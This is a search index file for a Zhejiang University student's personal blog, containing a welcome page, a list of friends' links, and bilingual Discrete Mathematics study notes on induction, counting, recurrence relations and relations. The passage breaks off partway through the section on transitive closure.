{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to my blog","text":"<p>\u6211\u662f\u534e\u96f6(zyk)\uff0cZJU\u8f6f\u4ef6\u5de5\u7a0b\u4e13\u4e1a\u5728\u8bfb\uff0c\u6b22\u8fce\u6765\u770b\u6211\u7684\u535a\u5ba2\u5440~</p> <p>\u6211\u5e0c\u671b\u8bb8\u4e0b\u7684\u613f\u671b\uff0c\u4e00\u8def\u751f\u82b1</p>"},{"location":"#_1","title":"\u8fd1\u671f\u7684\u5de5\u4f5c","text":"<ul> <li>TempFlow-GRPO: When Timing Matters for GRPO in Flow Models arxiv|github page</li> </ul>"},{"location":"#_2","title":"\u8fd9\u662f\u4e00\u4e9b\u6709\u7528\u7684\u8fde\u63a5","text":"<p>\u4e00\u4e9b\u6709\u7528\u7684\u8fde\u63a5</p> <ul> <li>CS\u81ea\u5b66\u6307\u5357\uff0c\u6bcf\u4e2a\u4eba\u90fd\u8be5\u4f53\u9a8c\u4e00\u4e0b\u597d\u7684\u5927\u5b66\u8bfe\u7a0b\u5e94\u8be5\u662f\u600e\u4e48\u6837\u7684</li> <li>\u6d59\u6c5f\u5927\u5b66\u672c\u79d1\u65b0\u751f\u6307\u5f15</li> <li>\u5e38\u7528\u7684\u67e5\u6c47\u7f16\u5de5\u5177</li> <li>\u5e38\u7528\u7684LaTeX\u516c\u5f0f\u67e5\u8be2</li> <li>QuickRef</li> </ul>"},{"location":"#_3","title":"\u6211\u548c\u6211\u7684\u670b\u53cb\u4eec\uff01","text":"<p>\u6211\u548c\u6211\u7684\u670b\u53cb\u4eec</p> <p> \u8bed\u82e5's note \u90a3\u662f\u6211\u6700\u60f3\u7559\u4f4f\u7684\u5e78\u8fd0 zjgg's person page \\zjgg/\\zjgg/\\zjgg/ Qiran's Space \u5389\u5bb3\u5e05\u6c14\u7684wygg xygg\u7684GitHub \u8f6f\u5de5\u5148\u8f88\uff0c\u4f46\u662f\u5356\u5f31\u602a \u6684\u6684\u7684\u535a\u5ba2 \u6684\u6684\u6559\u6559\u6211~ jiepeng's notebook \u5e05\u6c14\u7684\u6770\u54e5\uff01 MuZibing's website \u963f\u4f1f\u7684\u7b14\u8bb0\u672c sol\u7684\u535a\u5ba2 sol\u4f6c\u6559\u6b7b\u6211 pygg's blog pygg\u7684\u535a\u5ba2\u597d\u770b\u634f wcgg's site wcgg\u597d\u5389\u5bb3 6a\u7684\u535a\u5ba2 gingogg~ mem.ac \u7ed9\u795e\u4ed9\u5b66\u5f1f\u8dea\u4e86 qf\u7684home qf\u8001\u5e08\u5389\u5bb3\u634f lsgg\u7684\u8bad\u7ec3\u697c lsgg\u5e26\u6211\u7ec3\u7ec3QAQ HJY's blog \u560e\u560e\u8001\u5e08 \u9648\u601d\u738b\u7684\u4e3b\u9875 \u662f\u6837\u8001\u5e08\uff01 Cyrus's blog \u662f\u8d85\u5389\u5bb3\u7684\u5b66\u5f1f\uff01 \u83b1\u8335\u751f\u547d\u6d59\u5927\u5206\u90e8 \u4f20\u5947\u6735\u6735\u7f51\u7ea2\u6bdb\u6bdb\u7684\u535a\u5ba2 </p>"},{"location":"ZJU-course/Discrete%20Mathematics/","title":"\u79bb\u6563\u6570\u5b66\u53ca\u5e94\u7528","text":"<p>\u79bb\u6563\u8865\u5929</p> <ol> <li>\u7eaf\u7cb9\u7684\u8865\u5929\u7b14\u8bb0\uff0c\u57fa\u672c\u6ca1\u6709\u4ec0\u4e48\u9605\u8bfb\u7684\u4ef7\u503c\uff0c\u653e\u4e0a\u6765\u51d1\u6570\u7684bushi</li> <li>\u79bb\u6563\u8fd9\u95e8\u8bfe\u786e\u5b9e\u6709\u76f8\u5f53\u7684\u96be\u5ea6\uff0c\u65e0\u8bba\u662f\u82f1\u6587\u6388\u8bfe\u8fd8\u662f\u5e9e\u5927\u7684\u590d\u4e60\u8303\u56f4\uff0c\u5efa\u8bae\u65e5\u5e38\u4e0d\u8981\u653e\u677e\u5b66\u4e60</li> <li>\u867d\u7136\u8fd9\u95e8\u8bfe\u6559\u7684\u4e1c\u897f\u5f88\u591a\u5e76\u4e14\u6211\u6700\u540e\u83b7\u5f97\u7684\u6210\u7ee9\u8fd8\u4e0d\u9519\uff0c\u4f46\u662f\u6ca1\u6709\u5b66\u5230\u5f88\u591a\u4e1c\u897f\u7684\u5b9e\u611f\uff0c\u611f\u89c9\u4ee5\u540e\u5e94\u8be5\u8fd8\u9700\u8981\u56de\u8fc7\u6765\u5b66\u4e60\uff0c\u82e5\u662f\u6709\u65b0\u7684\u7b14\u8bb0\u7684\u8bdd\u5e94\u8be5\u4f1a\u628a\u8fd9\u7bc7\u66ff\u6362\u6389</li> </ol>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit5-induction-and-recursionno-55","title":"Unit5 Induction and Recursion(no 5.5)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#51-mathematical-induction-331-264","title":"5.1 Mathematical Induction 331 264","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-mathematical-induction","title":"1) introduction to mathematical induction","text":"<p>propose: prove P(n) is true for all positive integer n basis step: prove P(1) is true inductive step: to prove P(k)-&gt;P(k+1) is true</p> <p>we need to assume P(k) is true, This step is called inductive hypothesis</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-examples-using-mathematical-induction","title":"2) examples using mathematical induction","text":"<p>read it in the book(important)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#52-strong-induction-and-well-ordering-354-281","title":"5.2 Strong Induction and Well-Ordering 354 281","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-strong-induction","title":"1) introduction to strong induction","text":"<p>propose: prove P(n) is true for all positive integer n basis step: prove P(1) is true inductive step: to prove (P(1)andP(2)andP(3)...andP(k))-&gt;P(k+1) is true</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-some-examples-about-strong-induction","title":"2) some examples about strong induction","text":"<p>If n is an integer &gt;=1, then n can be written as the product of primes</p> <p>and others can read in the book </p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-using-strong-induction-in-computational-geometry","title":"3) using strong induction in computational geometry","text":"<p>A simple polygon with n sides, where n is an integer with n \u2265 3, can be triangulated into n \u2212 2 triangles.</p> <p>Every simple polygon with at least four sides has an interior diagonal(\u5185\u90e8\u5bf9\u89d2\u7ebf).</p> <p>we can read the proof in book</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-well-ordering-property","title":"3) well-ordering property","text":"<p>Every nonempty set of nonnegative integers has a least element.</p> <p>examples of application of well-ordering property can find at book</p> <p>like \u53ef\u4ee5\u8bc1\u660e\u6574\u9664\u7b97\u6cd5\u7684\u7ed3\u679c\u662f\u552f\u4e00\u4e14\u5b58\u5728\u7684</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#53-recursive-definitions-and-structural-induction-365-291","title":"5.3 Recursive Definitions and Structural Induction 365 291","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-recursively-defined-functions","title":"1) recursively defined functions","text":"<p>basis step: specify f(0) recursive step: using smaller integer to find the value of f(n) such as: f(n+1)=f(n)+1</p> <p>a recursively defined functions is well defined if and only if, for every positive integer, the value of function at that integer is determined.</p> <p>LAME theorem: \u8bbea&gt;=b\u4e14a b\u5747\u4e3a\u6b63\u6574\u6570\uff0c\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u7b97\u51fagcd\uff08a\uff0cb\uff09\u6240\u7528\u9664\u6cd5\u7684\u6b21\u6570\u5c0f\u4e8e\u7b49\u4e8eb\u7684\u5341\u8fdb\u5236\u4f4d\u6570\u76845\u500d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-recursivey-defined-sets-and-structures","title":"2) recursivey defined sets and structures","text":"<p>there are many examples and we can read it in the book</p> <p>\u8fd8\u8981\u4e86\u89e3\u7ed3\u6784\u5f52\u7eb3\u6cd5\u548c\u5e7f\u4e49\u5f52\u7eb3\u6cd5\u7684\u542b\u4e49</p> <p>bite string </p>"},{"location":"ZJU-course/Discrete%20Mathematics/#54-recursively-algorthims-381-305","title":"5.4 Recursively Algorthims 381 305","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-the-introduction-to-recursively-algorthims","title":"1) the introduction to recursively algorthims","text":"<p>it solves a problem by reducing it to an instance of the same problem with small input.</p> <p>for example:</p> <p>procedure factorial(n: nonnegative integer)</p> <p>if n = 0 then return 1</p> <p>else return n \u22c5 factorial(n \u2212 1)</p> <p>{output is n!}</p> <p>procedure gcd(a, b: nonnegative integers with a &lt; b)</p> <p>if a = 0 then return b</p> <p>else return gcd(b mod a, a)</p> <p>{output is gcd(a, b)}</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-proving-correct","title":"2) proving correct","text":"<p>we can use mathematical induction to prove a recurrence algorthim is correct.</p> <p>for example</p> <p>\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-recursion-and-iteration","title":"3) recursion and iteration(\u8fed\u4ee3)","text":"<p>\u8fed\u4ee3\u5c31\u662f\u901a\u8fc7\u8ba1\u7b97\u8f83\u5c0f\u6570\u503c\u70b9\u7684\u51fd\u6570\u503c\u6765\u6700\u7ec8\u6c42\u51fa\u8f83\u5927\u6570\u503c\u70b9\u7684\u51fd\u6570\u503c\uff0c\u4f8b\u5982\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff0c\u901a\u8fc7\u9012\u5f52\u516c\u5f0f\u6c42\u503c\u4e0e\u901a\u8fc7\u76f4\u63a5\u7684\u8868\u8fbe\u5f0f\u6c42\u503c\u8fd0\u7b97\u96be\u5ea6\u662f\u4e0d\u540c\u7684</p> <p>procedure iterative fifibonacci(n: nonnegative integer)</p> <p>if n = 0 then return 0</p> <p>else</p> <p>x := 0</p> <p>y := 1</p> <p>for i := 1 to n \u2212 1</p> <p>z := x + y</p> <p>x := y</p> <p>y := z</p> <p>return y</p> <p>{output is the nth Fibonacci number}</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-the-merge-sort","title":"4) the merge sort(\u5f52\u5e76\u6392\u5e8f)","text":"<p>\u5c06\u4e00\u5217\u6570\u5bf9\u534a\u5206\uff0c\u5982\u679c\u65e0\u6cd5\u5bf9\u534a\u5206\u5219\u5de6\u5b50\u6811\u591a\u4e00\u4e2a\uff0c\u76f4\u5230\u5168\u90e8\u5206\u5230\u53f6\u5b50\u8282\u70b9\u65f6\uff0c\u518d\u53cd\u63a8\u56de\u53bb\uff0c\u53cd\u63a8\u56de\u53bb\u65f6\u8fdb\u884c\u6bd4\u8f83\u6392\u5e8f</p> <p>the algorithms:</p> <p>\u5f52\u5e76 procedure mergesort(L=a1 a2 a3 ... an) ifn&gt;1then     m:=n/2\u5411\u4e0b\u53d6\u6574         l1=a1 a2 a3... am         l2=am+1  am+2 .....an         l=merge(l1,l2)</p> <p>\u6392\u5e8f</p> <p>procedure merge(L1, L2 : sorted lists)</p> <p>L := empty list</p> <p>while L1 and L2 are both nonempty</p> <p>remove smaller of fifirst elements of L1 and L2 from its list; put it at the right end of L  \uff08\u6bd4\u8f83\u4e24\u4e2a\u6570\u5217\u7684\u7b2c\u4e00\u4e2a\u6570\uff0c\u7136\u540e\u628a\u5c0f\u7684\u90a3\u4e2a\u63d2\u5165\uff09</p> <p>if this removal makes one list empty then remove all elements from the other list and append them to L</p> <p>return L{L is the merged list with elements in increasing order}</p> <p>\u4f7f\u7528\u4e0d\u8d85\u8fc7m+n-1\u6b21\u6bd4\u8f83\uff0c\u53ef\u4ee5\u628am\u4e2a\u5143\u7d20\u548cn\u4e2a\u5143\u7d20\u4e24\u4e2a\u6709\u5e8f\u8868\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u8868</p> <p>\u5bf9\u4e8e\u4e00\u4e2an\u4e2a\u5143\u7d20\u7684\u8868\u8fdb\u884c\u5f52\u5e76\u6392\u5e8f\u6240\u9700\u7684\u6bd4\u8f83\u6b21\u6570\u4e3aO(nlogn)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit6-countingno-66","title":"Unit6 Counting(no 6.6)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#61-the-basics-of-counting","title":"6.1 The Basics of Counting","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-two-basic-counting-principles","title":"1) two basic counting principles","text":"<p>the product rule(\u4e58\u6cd5\u6cd5\u5219) and the sum rule(\u52a0\u6cd5\u6cd5\u5219)</p> <p>here are some examples </p> <p>\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-more-complex-counting-problems","title":"2) more complex counting problems","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#3-the-subtraction-ruleinclusion-exclusion-for-two-set","title":"3) the subtraction rule(inclusion-exclusion for two set)","text":"<p>\u5bb9\u65a5\u539f\u7406</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-the-division-rule","title":"4) the division rule","text":"<p>\u200b\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#62-the-pigeonhole-principle-420-338","title":"6.2 The Pigeonhole Principle 420 338","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-pigeonhole-principle","title":"1) introduction to pigeonhole principle","text":"<p>\u5982\u679c\u9e3d\u5b50\u6570\u91cf\u6bd4\u9e3d\u5b50\u5de2\u6570\u91cf\u8981\u591a\uff0c\u90a3\u4e48\u4e00\u5b9a\u6709\u4e00\u4e2a\u9e3d\u5b50\u5de2\u91cc\u9762\u6709\u81f3\u5c11\u4e24\u53ea\u9e3d\u5b50</p> <p>we also called it as Dirichlet drawer principle.</p> <p>here are some corollary(\u63a8\u8bba) like A function from set with k+1 or more elements to a set with k elements is not one-to-one.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-the-generalized-pigeonhole-principle","title":"2) the generalized pigeonhole principle","text":"<p>If N objects are placed into k boxes, then there is at least one box containing at least \u2308N/k\u2309 objects. </p> <p>here is some examples</p> <p>\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-some-applications-of-the-pigeonhole-principle","title":"3) some applications of the pigeonhole principle","text":"<p>Among any n+1 positive integers not exceeding 2*n there must be an integer that divides one of the other integers.</p> <p>Every sequence of n**2+1 distinct real numbers contains a subsequence of length n+1 that is either strictly increasing or strictly decreasing.</p> <p>\u200b</p> <p>Ramsey theory, Ramsey number R(m,n) m&gt;=2 n&gt;=2 Minimum number of people at a party such that there are either m mutual friends or n mutual enemies. They are friends or enemies.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#63-permutations-and-combinations-428-345","title":"6.3 Permutations and Combinations(\u6392\u5217\u7ec4\u5408) 428 345","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-permutations","title":"1) permutations","text":"<p>r-permutation is a permutation that find r elements of a set and permute them</p> <p>If n is a positive integer and r is an integer with 1 \u2264 r \u2264 n, then there are</p> <pre><code>  P(n, r) = n(n \u2212 1)(n \u2212 2) \u22ef (n \u2212 r + 1)\n</code></pre> <p>r-permutations of a set with n distinct elements.</p> <p>if r could be 0</p> <pre><code>   P(n,r)=n! / (n-r)!\n</code></pre>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-combinations","title":"2) Combinations","text":"<p>The number of r-combinations of a set with n elements, where n is a nonnegative integer and</p> <p>r is an integer with 0 \u2264 r \u2264 n, equals</p> <p>C(n, r) = n! / r!*(n-r)!</p> <p>we also called C(n,r) as binomal coefiicient</p> <p>C(n, r) = C(n, n \u2212 r)</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#64-binomial-coefficients-and-identities437-351","title":"6.4 Binomial Coefficients and Identities(\u6052\u7b49\u5f0f)437 351","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-the-binomial-theorem","title":"1) the Binomial Theorem","text":"<p>\u200b</p> <p>the sum of C(n,k) from k=0 to k=n is 2n the sum of C(n,k) (-1)k from k =0 to k=n is 0*</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-pascals-identity-and-triangle","title":"2) Pascal's Identity and Triangle","text":"<p>C(n+1, k)=C(n, k-1)+C(n, k)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-other-indentities-involving-binomial-coefficiens","title":"3) other indentities involving binomial coefficiens","text":"<p>C(2n, n)=\u2211C(n,k)**2</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#65-generalized-permutations-and-combinations-445-358","title":"6.5 Generalized Permutations and Combinations 445 358","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-permutations-with-repetition","title":"1) Permutations with repetition","text":"<p>The number of r-permutations of a set of n objects with repetition allowed is n**r </p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-combinations-with-repetition","title":"2) Combinations with repetition","text":"<p>\u5c06\u7269\u4f53\u548c\u6321\u677f\u540c\u65f6\u6392\u5217\u7ec4\u5408</p> <p>the ans is C(n+r-1, r)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-permutations-with-indistinguishabele-objects","title":"3) Permutations with indistinguishabele objects","text":"<p>\u5c31\u662f\u7269\u54c1\u4e2d\u5b58\u5728\u4e0d\u53ef\u533a\u5206\u7684\u4e1c\u897f</p> <p>\u8bbe\u7c7b\u578b1\u6709\u76f8\u540c\u7684\u7684n1\u4e2a \u7c7b\u578b2\u6709\u76f8\u540c\u7684n2\u4e2a\u3002\u3002\u3002\u3002 \u8fd9\u4e2a\u4e00\u5171n\u4e2a\u7269\u4f53\u7684\u6392\u5217\u6570\u5373\u4e3a n! / (n1! * n2! * n3!....)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#4-distributing-objects-into-boxes","title":"4) Distributing Objects into Boxes","text":"<p>we have four different situations</p> <p>distinguishable objects and distinguishable boxes \u5c06n\u4e2a\u4e0d\u540c\u7269\u4f53\u653e\u5230k\u4e2a\u7bb1\u5b50\uff0c\u4e14\u6bcf\u4e2a\u7bb1\u5b50\u6240\u8981\u7684\u7269\u4f53\u6570\u4e3ani \u6392\u5217\u7ec4\u5408\u6570\u4e3a n! / (n1! * n2! * n3!....)</p> <p>indistinguishable objects and distinguishable boxes C(n + r \u2212 1, n \u2212 1)</p> <p>distinguishable objects and indistinguishable boxes</p> <p>see the book</p> <p>indistinguishable objects and indistinguishable boxes</p> <p>p(n,k)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit-8-advanced-counting-techniquesno-83","title":"Unit 8 Advanced Counting Techniques(no 8.3)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#81-applications-of-recurrence-relations","title":"8.1 Applications of Recurrence Relations","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-recurrence-relation","title":"1) recurrence relation","text":"<p>recurrence relation is a rule for determining subequent terms from those precede one.</p> <p>we can define models with recurrence relation, like Fibonacci(\u6590\u6ce2\u90a3\u5951) or Hanoi Puzzle(\u6c49\u8bfa\u5854)</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2algorithms-and-recurrence-relations","title":"2)Algorithms and Recurrence Relations","text":"<p>dynamic programming(\u52a8\u6001\u89c4\u5212). It recursively breaks down a problem into simpler overlapping subproblems.</p> <p>Example of schedule of lectures.P536</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#82-solving-linear-recurrence-relations","title":"8.2 Solving Linear Recurrence Relations","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1introduction-to-inear-homogeneous-recurrence-relation","title":"1)introduction to inear homogeneous recurrence relation","text":"<p>\\(an = c1an\u22121 + c2an\u22122 + \u22ef + ckan\u2212k\\) </p> <p>where c1, c2, \u2026 , ck are real numbers, and ck \u2260 0. and they are no depend on n.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2solving-linear-homogeneous-recurrence-relations","title":"2)solving linear homogeneous recurrence relations","text":"<p>using the  characteristic equation(\u7279\u5f81\u65b9\u7a0b) and characteristic roots.</p> <p>\\(rk \u2212 c1rk\u22121 \u2212 c2rk\u22122 \u2212 \u22ef \u2212 ck\u22121r \u2212 ck = 0.\\) </p> <p>there are several roots r1 r2 r3</p> <p>an = \ud835\udefc1r1 n + \ud835\udefc2r2n+a3r3n</p> <p>if there is one characteristic root of multiplicity. We can find the method foremore is not applied.</p> <p>the characteristic equation with multiplicly roots</p> <p>\u200b\u200b</p> <p>each coefficients(\u7cfb\u6570) will depend on its mulitplies.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3linear-nonhomogeneous-recurrence-relations-with-constant-coefficient","title":"3)linear nonhomogeneous recurrence relations with constant coefficient","text":"<p>a recurrence equation like </p> <p>\\(an = c1an\u22121 + c2an\u22122 + \u22ef + ckan\u2212k + F(n),\\) </p> <p>is called linear nonhomogeneous recurrence relations.</p> <p>and it will have a equation like</p> <p>\\(an = c1an\u22121 + c2an\u22122 + \u22ef + ckan\u2212k\\) </p> <p>is its associated homogeneous recurrence relation(\u76f8\u4f34\u5173\u7cfb)</p> <p>The answer of this recurrence equation will be X+Y</p> <p>X is the answer its associated homogeneous recurrence relation.</p> <p>Y is a special answer of this relation with constant coefficient.</p> <p>Then we will introdcue how to find the special answer.</p> <p>it depends on F(n), if F(n) is like:</p> <p>\\(F(n) = (btnt + bt\u22121nt\u22121 + \u22ef + b1n + b0)sn,\\) </p> <p>and it will special answer like when s isn't the root</p> <p>\\(( ptnt + pt\u22121nt\u22121 + \u22ef + p1n + p0)sn.\\) </p> <p>if s is root and its multiplicity is m</p> <p>\\(nm(ptnt + pt\u22121nt\u22121 + \u22ef + p1n + p0)sn\\) </p>"},{"location":"ZJU-course/Discrete%20Mathematics/#84-generating-functions","title":"8.4 Generating Functions","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-the-introduction-to-generating-function","title":"1) The introduction to generating function","text":"<p>\u200b</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-the-application-of-generating-function","title":"2) The application of generating function.","text":"<p>generating function is closely connected with formal power series(\u5e42\u7ea7\u6570)</p> <p>extended binomial coefficient(\u5e7f\u4e49\u4e8c\u9879\u7cfb\u6570): \u200b</p> <p>and we have extended binomial theorem. We can use it to find some generating function. We can use this theorem when (1+x)^u u is real numbers and |x|&lt;1</p> <p>We can find some Generating Function in page 568.</p> <p>generating function can be used to solve some counting problem. Such as \u200b</p> <p>this power series of x is the generating function of this problem.</p> <p>We can use generating function to solve recurrence relation</p> <p>using this recurrence {an} to the coefficient of the generating function, such as :</p> <p>\u200d</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>We can use generating function to solve Identities(\u6052\u7b49\u5f0f)</p> <p>\u200b\u200b</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#85-inclusion-exclusion-464","title":"8.5 Inclusion-Exclusion(\u5bb9\u65a5) 464","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-the-principle-of-inclusion-exclusion","title":"1) the principle of Inclusion-Exclusion","text":"<p>it is a way to count the number of element in a set.</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#86-applications-of-inclusion-exclusion-469","title":"8.6 Applications of Inclusion-Exclusion 469","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-application-in-counting","title":"1) Application in counting","text":"<p>\u51e0\u4e2a\u5143\u7d20\u5230\u51e0\u4e2a\u5143\u7d20\u7684\u6620\u5c04</p> <p>\u5bb9\u65a5\u539f\u7406\u7684\u4e00\u5927\u5e94\u7528\u5c31\u662f\u8f6c\u5316\u4e3aN(P1P2P3...Pn) \u5177\u6709\u67d0\u79cd\u6027\u8d28\u7684\u5143\u7d20\u4e2a\u6570 \u548c\u4e0d\u5177\u6709\u67d0\u79cd\u6027\u8d28\u7684\u5143\u7d20\u4e2a\u6570</p> <p>\u4f8b\u5982\uff1a\u5c06\u4e5d\u4e2a\u7403\u653e\u5230\u4e5d\u4e2a\u76d2\u5b50\u91cc\uff0c\u8981\u6c42\u53ea\u653e\u56db\u4e2a\u76d2\u5b50</p> <p>\uff084 ^ 9 -C(4,1) 3 ^ 9+ C(4,2) 2  ^ 9 -C(4,3)\uff09*C(9,4)</p> <p>4^9 \u7684\u60c5\u51b5\u51cf\u53bb\u4ec5\u6709\u4e09\u4e2a\u76d2\u5b50\u88ab\u653e\u7684\u60c5\u51b5\uff0c\u52a0\u4e0a\u53ea\u6709\u4e24\u4e2a\u76d2\u5b50\u88ab\u653e\u7684\u60c5\u51b5\uff0c\u51cf\u53bb\u53ea\u6709\u4e00\u4e2a\u76d2\u5b50\u88ab\u653e\u7684\u60c5\u51b5</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#unit-9-relationsno-92","title":"Unit 9 Relations(no 9.2)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#91-relations-and-their-properties","title":"9.1 Relations and Their Properties(\u6027\u8d28)","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1binary-relation","title":"1).Binary relation","text":"<p>A and B are sets. A binary relation from A to B is a subset of AxB. Binary relation from A to B is a set R of ordered pairs(\u6709\u5e8f\u5bf9). \u200b(a, b) \u2208 R is express a \u2208 A and b \u2208 B. It is denoted as aRb.</p> <p>Function as relation. A function from A to B is a relation.</p> <p>Relation on a set: A relation from a set A is a relation from A to A.</p> <p>For Example:</p> <p>R1 = {(a, b) \u2223 a \u2264 b},</p> <p>R2 = {(a, b) \u2223 a &gt; b},</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2properties-of-relations","title":"2).Properties of Relations","text":"<p>reflexive(\u81ea\u53cd): A relation R on a set A is called reflflexive if (a, a) \u2208 R for every element a \u2208 A.</p> <pre><code>       we all assume it is a relation R on a set A and a,b,c \u2208 A.\n</code></pre> <p>symmetric(\u5bf9\u79f0):If (b, a) \u2208 R, then(a, b) \u2208 R.</p> <p>antisymmetric(\u53cd\u5bf9\u79f0): if (a, b) \u2208 R and (b, a) \u2208 R, then a = b.</p> <p>transitive(\u4f20\u9012): if whenever (a, b) \u2208 R and (b, c) \u2208 R, then (a, c) \u2208 R.</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3combining-relations","title":"3).Combining Relations","text":"<p>Basic Combining: R1 \u222a R2, R1 \u2229 R2, R1 \u2295 R2, R1 \u2212 R2, and R2 \u2212 R1. We can all refer to set theory.</p> <p>Composite of R and S: R and S are two relations.R is a relation from A to B,and S is a relation from B to C. A new relation N = S \u25e6 R. N is a relation from A to C. (a,c)\u2208N if and only if (a,b)\u2208A and (b,c)\u2208B.</p> <p>Let R be a relation on the set A. The powers Rn, n = 1, 2, 3, \u2026 , are defifined recursively by</p> <p>R1 = R and Rn+1 = Rn \u25e6 R.</p> <p>The relation R on a set A is transitive if and only if Rn \u2286 R for n = 1, 2, 3, \u2026 .</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#93-representing-relations-621-495","title":"9.3 Representing Relations 621 495","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1matrices-representing","title":"1).Matrices(\u77e9\u9635) representing","text":"<p>We can use a zero-one matrix to represent the relation. Now we assume a relation from A to B. We can create a matrix M = [mij].</p> <p>\u200b</p> <p>Properties of Matrices:</p> <p>\u200b</p> <p>Combining of Matrices</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2graphs-representing","title":"2).Graphs representing","text":"<p>A directed graph, or we called it digraph. It consists of set of V(\u9876\u70b9\u7684\u96c6\u5408) and ordered pairs of elements of V like (a,b) we called this pairs as edges. We take edge (a,b) as an example, a is initial vertex(\u59cb\u70b9), and b is terminal tervex(\u7ec8\u70b9). specially, we called edge like (a, a) as loop.</p> <p>if a relation is symmetric, we can use an undirected graph to represent it.</p> <p>\u200d</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#94-closures-of-relations-628-500","title":"9.4 Closures of Relations 628 500","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-closure","title":"1) introduction to closure","text":"<p>R\u662f\u96c6\u5408A\u4e0a\u7684\u5173\u7cfb\uff0c\u4f46\u662fR\u6ca1\u6709\u6027\u8d28P\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u96c6\u5408A\u4e0a\u7684\u5173\u7cfbS\uff0cR\u662fS\u7684\u5b50\u96c6\u800c\u4e14\u5e76\u4e14S\u6709\u6027\u8d28P\uff0c\u5219\u79f0S\u662fR\u5173\u4e8e\u6027\u8d28P\u7684\u95ed\u5305</p> <p>there many types of closures, the type is about porperty.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-paths-in-directed-graphs","title":"2) paths in directed graphs","text":"<p>path in graph \u662f\u7531\u4e00\u6761\u8fb9\u6216\u591a\u6761\u8fb9\uff0c\u8fb9\u4e0e\u8fb9\u5fc5\u987b\u662f\u76f8\u8fde\u7684\uff0c\u7ec4\u6210\u7684\u5e8f\u5217\uff0c\u7279\u522b\u5730\uff0c\u6211\u4eec\u5c06\u8d77\u59cb\u70b9\u548c\u7ec8\u70b9\u4e3a\u540c\u4e00\u4e2a\u9876\u70b9\u7684path\u53eb\u505acircuit or cycle</p> <p>theorem: R is a relation on a set A, there is a path of length n, and the path is from a to b, if and only if (a, b)\u5c5e\u4e8e R^n</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#3-transitive-closure","title":"3) transitive closure","text":"<p>definition: R is a relation on a set A, the connectively relation R* consists of pairs like (a, b), such that there is path of length at least one from a to b in 